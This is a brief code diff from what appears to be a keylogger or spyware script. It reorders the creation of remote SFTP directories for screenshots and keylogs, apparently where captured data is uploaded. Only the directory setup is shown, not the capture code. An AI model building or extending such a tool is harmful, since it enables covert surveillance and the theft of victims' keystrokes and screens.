@@ -44,11 +44,13 @@ if is_online():
     sftp_server = sftp_server()
 
     if sftp_server:
-        if not sftp_server.exists(bytes(remote_screenshots_dir)):
-            sftp_server.mkdir(bytes(remote_screenshots_dir))
 
         if not sftp_server.isdir(bytes(remote_dir)):
             sftp_server.mkdir(bytes(remote_dir))
+
+        if not sftp_server.exists(bytes(remote_screenshots_dir)):
+            sftp_server.mkdir(bytes(remote_screenshots_dir))
+
         if not sftp_server.isdir(bytes(remote_keylogs_dir)):
             sftp_server.mkdir(bytes(remote_keylogs_dir))
 
